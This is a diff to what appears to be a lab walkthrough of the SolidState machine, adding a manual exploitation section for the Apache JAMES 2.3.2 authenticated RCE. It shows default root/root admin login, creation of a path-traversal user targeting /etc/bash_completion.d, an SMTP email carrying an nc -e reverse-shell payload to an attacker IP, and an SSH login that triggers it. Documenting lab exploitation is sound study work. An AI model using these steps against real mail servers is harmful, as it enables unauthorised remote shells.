@@ -153,7 +153,7 @@ Apache JAMES (`Java Apache Mail Enterprise Server`) is an open-source `Java-base
 
 <br />
 
-Our research revealed that `Apache JAMES 2.3.2` is vulnerable to an authenticated `Remote Command Execution` (RCE).
+Our research revealed that `Apache JAMES 2.3.2` is vulnerable to an authenticated Remote Command Execution (RCE).
 
 <br />
 
@@ -489,7 +489,7 @@ except:
 
 <br />
 
-The functionality of this exploit is straightforward.
+The exploit’s functionality is straightforward and easy to replicate.
 
 The logic can be broken down as follows:
 
@@ -497,10 +497,94 @@ The logic can be broken down as follows:
 
 2. Establish socket connections to ports `4555` (admin) and `25` (SMTP).
 
-3. Send the payload via `SMTP` to write it into a startup script location.
+3. Create a user and send the payload via `SMTP` to write it into a startup script location.
 
 4. Wait for an `SSH` login to trigger execution of the payload.
 
-To obtain a reverse shell, we substitue
+<br />
 
+## Manual Exploitation:
 
+<br />
+
+To better understand the exploitation process, we will perform it manually step by step.
+
+First, we authenticate to JAMES and create the user:
+
+<br />
+
+```bash
+❯ telnet 10.10.10.51 4555
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login id:
+root
+Password:
+root
+Welcome root. HELP for a list of commands
+adduser ../../../../../../../../etc/bash_completion.d TheRedP4nther
+User ../../../../../../../../etc/bash_completion.d added
+quit
+Bye
+Connection closed by foreign host.
+```
+
+<br />
+
+Then, we send an email to this user containing the reverse shell payload:
+
+<br />
+
+```bash
+❯ telnet 10.10.10.51 25
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
+220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 13 Aug 2025 14:41:20 -0400 (EDT)
+EHLO TheRedP4nther
+250-solidstate Hello TheRedP4nther (10.10.14.10 [10.10.14.10])
+250-PIPELINING
+250 ENHANCEDSTATUSCODES
+MAIL FROM: <'TheRedP4nther@10.10.14.10>
+250 2.1.0 Sender <'TheRedP4nther@10.10.14.10> OK
+RCPT TO: <../../../../../../../../etc/bash_completion.d>
+250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
+DATA
+354 Ok Send data ending with <CRLF>.<CRLF>
+FROM: TheRedP4nther@10.10.14.10 
+'
+/bin/nc -e /bin/bash 10.10.14.10 443
+.
+250 2.6.0 Message received
+```
+
+<br />
+
+Finally, we trigger the `reverse shell` login via `SSH`:
+
+<br />
+
+```bash
+sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51
+```
+
+<br />
+
+If we check our listener:
+
+<br />
+
+```bash
+❯ sudo nc -nlvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.51 48030
+id
+uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
+```
+
+<br />
